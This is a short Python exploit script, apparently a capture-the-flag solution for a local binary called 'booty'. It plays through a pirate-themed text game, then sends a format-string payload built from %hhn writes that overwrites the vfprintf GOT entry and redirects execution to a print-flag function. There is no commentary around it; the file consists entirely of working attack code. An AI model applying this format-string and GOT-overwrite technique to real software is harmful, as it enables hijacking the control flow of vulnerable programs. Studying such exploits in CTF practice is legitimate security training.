from pwn import *
from zio import *
import sys

target = "./booty"

def get_io(target):
	ELF("./booty")
	io = zio(target, timeout = 9999, print_read = COLORED(RAW, "green"), print_write = COLORED(RAW, "blue"))
	return io

def pass_game(io, stage = 1):
	level = 0
	while True:
		data = io.read_until("> ")
		pos = data.find("LEVEL  ")
		if pos != -1:
			pos += len("LEVEL  ")
			level = int(data[pos:pos + 1])

		elif data.find("HAIL THE NEW PIRATE KING") != -1:
			if level == 9:
				print "pass"
				io.write("y\n")
				return
		#play game
		if "flex their muscles" in data:
			io.write("h\n")
		elif "looking exhausted" in data:
			io.write("p\n")
		elif "starts to tense up" in data:
			io.write("r\n")
		else:
			io.interactive()


def generate_format(index, size):
	buff = ""
	while True:
		each_one = "%" + "%d$p."%index
		if len(buff) + len(each_one) > size:
			return buff, index
		buff += each_one
		index += 1

def pwn(io):

	vfprintf_got = 0x0804a138
	print_flag_addr = 0x80487C0

	#name = 'a' * 4 + 'b' * 4 + 'c' * 4 + 'd' * 4 + "%" + generate_format(30, 63 - 5)[0]
	name = 'a' * 4 + 'b' * 4 + 'c' * 4 + 'd' * 4 + "%"
	t_len = len(name)
	name += "%" + "%dc"%(0x87 - len(name)) + "%" + "%d$hhn"%(30)
	name += "%" + "%dc"%(0xc0 - 0x87) + "%" + "%d$hhn"%(31)
	name += "%" + "%dc"%(0x104 - 0xc0) + "%" + "%d$hhn"%(32)
	name += "%" + "%dc"%(0x108 - 0x104) + "%" + "%d$hhn"%(33)

	print len(name)
	raw_input(":")
	io.read_until("> ")
	io.write(name + "\n")

	pass_game(io)

	raw_input(":")
	name = p32(vfprintf_got + 1) + p32(vfprintf_got) + p32(vfprintf_got + 2) + p32(vfprintf_got + 3) + "p"
	io.read_until("> ")
	io.read_until("> ")
	io.write(name + "\n")
	pass_game(io, 2)
	io.interactive()


io = get_io(target)
pwn(io)


